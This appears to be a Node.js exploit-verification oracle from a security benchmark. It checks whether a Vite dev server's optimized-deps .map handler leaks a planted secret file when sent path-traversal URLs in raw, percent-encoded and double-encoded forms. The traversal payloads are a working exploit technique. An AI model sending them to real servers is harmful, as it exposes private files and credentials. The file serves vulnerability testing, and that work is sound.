'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

function makeFakeRes(onWrite) {
  const headers = {};
  const res = {
    statusCode: 200,
    _ended: false,
    headersSent: false,
    setHeader(k, v) { headers[k] = v; },
    getHeader(k) { return headers[k]; },
    removeHeader(k) { delete headers[k]; },
    writeHead(code, _headers) {
      res.statusCode = code;
      if (_headers) Object.assign(headers, _headers);
    },
    write(chunk) {
      if (chunk) onWrite(chunk.toString());
      return true;
    },
    end(chunk) {
      if (chunk) onWrite(chunk.toString());
      res._ended = true;
    },
    on() {},
    once() {},
    emit() {},
  };
  return res;
}

function dispatch(server, req, res) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      resolve();
    };
    const origEnd = res.end;
    res.end = function (chunk) {
      origEnd(chunk);
      finish();
    };
    try {
      server.middlewares.handle(req, res, (err) => {
        if (err) {
          settled = true;
          reject(err);
          return;
        }
        finish();
      });
    } catch (e) {
      if (!settled) {
        settled = true;
        reject(e);
      }
    }
    setTimeout(finish, 3000);
  });
}

async function safeClose(server) {
  if (!server) return;
  try { await server.close(); } catch (_) {}
}

async function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite_oracle_' + process.pid + '_' + Date.now();
  const root = path.join(os.tmpdir(), marker);
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
  const secretDir = path.join(os.tmpdir(), marker + '_secret');
  const secretFile = path.join(secretDir, 'secret.txt');
  const secretContent = 'TOP-SECRET-' + marker;

  let vite;
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(secretDir, { recursive: true });
    fs.writeFileSync(secretFile, secretContent, 'utf8');

    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'oracle-fixture', version: '0.0.0' }), 'utf8');
    fs.writeFileSync(path.join(root, 'index.html'), '<html></html>', 'utf8');

    vite = require('vite');
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed: ' + (e && e.message) });
    return;
  }

  try {
    server = await vite.createServer({
      root,
      configFile: false,
      logLevel: 'silent',
      server: { middlewareMode: true, hmr: false, watch: null },
      optimizeDeps: { noDiscovery: true, include: [] },
      cacheDir: path.join(root, 'node_modules', '.vite'),
    });
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'createServer failed: ' + (e && e.message) });
    return;
  }

  try {
    // Benign check: request an existing, legitimately placed .map file
    // inside the deps cache directory to prove normal serving works.
    const benignName = 'chunk-BENIGN.js';
    const benignMapName = benignName + '.map';
    const benignMapContent = JSON.stringify({ version: 3, sources: [], mappings: '', file: benignName });
    fs.writeFileSync(path.join(depsDir, benignName), '// benign chunk\n', 'utf8');
    fs.writeFileSync(path.join(depsDir, benignMapName), benignMapContent, 'utf8');

    const benignUrl = '/node_modules/.vite/deps/' + encodeURIComponent(benignMapName);
    const benignReq = { url: benignUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
    let benignBody = '';
    const benignRes = makeFakeRes((chunk) => { benignBody += chunk; });

    await dispatch(server, benignReq, benignRes);

    const benignOk = benignRes.statusCode && benignRes.statusCode < 400 && benignBody.includes('version');
    if (!benignOk) {
      result({ operation_completed: false, exploit_succeeded: false, evidence: 'benign deps map request failed, status=' + benignRes.statusCode + ' body=' + benignBody.slice(0, 200) });
      await safeClose(server);
      return;
    }

    operation_completed = true;

    // Malicious request: the vulnerable handler for optimized deps `.map`
    // requests is reported to resolve the requested .map path relative to
    // the deps directory without validating that the resolved path stays
    // within the deps/root directory, allowing traversal via an encoded
    // '%2e%2e%2f' / '..%2f' style filename segment that the dev server
    // decodes down to a path outside the deps dir. We try several common
    // encodings of the traversal sequence that have been used in public
    // proof-of-concepts for this class of bug, since the exact decoding
    // boundary (double-decode vs single-decode) determines which variant
    // triggers the bug in a given build.
    const relParts = path.relative(depsDir, secretFile).split(path.sep);

    const variants = [];

    // Variant 1: raw literal relative path with .. segments, as-is.
    variants.push('/node_modules/.vite/deps/' + relParts.join('/') + '.map');

    // Variant 2: each path segment percent-encoded individually (encodes
    // '..' as %2e%2e and '/' as %2f) so that a single decode pass by the
    // HTTP layer still leaves a traversal sequence for vite's own path
    // logic to mishandle.
    const encSegs = relParts.map((seg) => seg.split('').map((ch) => '%' + ch.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
    variants.push('/node_modules/.vite/deps/' + encSegs.join('%2f') + '.map');

    // Variant 3: double-encoded traversal (%252e%252e%252f) for servers
    // that decode the URL twice before reaching the vulnerable handler.
    const dblSegs = relParts.map((seg) => encodeURIComponent(encodeURIComponent(seg)));
    variants.push('/node_modules/.vite/deps/' + dblSegs.join('%252f') + '.map');

    let leaked = false;
    let threw = false;
    let errMsg = '';
    let status;
    let maliciousBody = '';

    for (const maliciousUrl of variants) {
      const maliciousReq = { url: maliciousUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
      let body = '';
      const maliciousRes = makeFakeRes((chunk) => { body += chunk; });
      try {
        await dispatch(server, maliciousReq, maliciousRes);
        status = maliciousRes.statusCode;
        maliciousBody = body;
        if (body.includes(secretContent)) {
          leaked = true;
          break;
        }
      } catch (e) {
        threw = true;
        errMsg = (e && e.message) || String(e);
        // keep trying other variants; an exception on one variant does not
        // prove the handler is safe for others.
      }
    }

    if (leaked) {
      exploit_succeeded = true;
      evidence = 'Path traversal succeeded: secret content leaked via deps .map handler, status=' + status;
    } else if (threw) {
      exploit_succeeded = false;
      evidence = 'Malicious requests blocked, last exception: ' + errMsg;
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious requests did not leak secret, last status=' + status + ' bodyLen=' + maliciousBody.length;
    }
  } catch (e) {
    if (operation_completed) {
      exploit_succeeded = false;
      evidence = 'Exception during malicious attempt (treated as blocked): ' + (e && e.message);
    } else {
      operation_completed = false;
      evidence = 'Unexpected failure before benign op completed: ' + (e && e.message);
    }
  } finally {
    await safeClose(server);
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) {}
    try { fs.rmSync(secretDir, { recursive: true, force: true }); } catch (_) {}
  }

  result({ operation_completed, exploit_succeeded, evidence });
}

main().catch((e) => {
  result({ operation_completed: false, exploit_succeeded: false, evidence: 'Unhandled top-level error: ' + (e && e.message) });
});
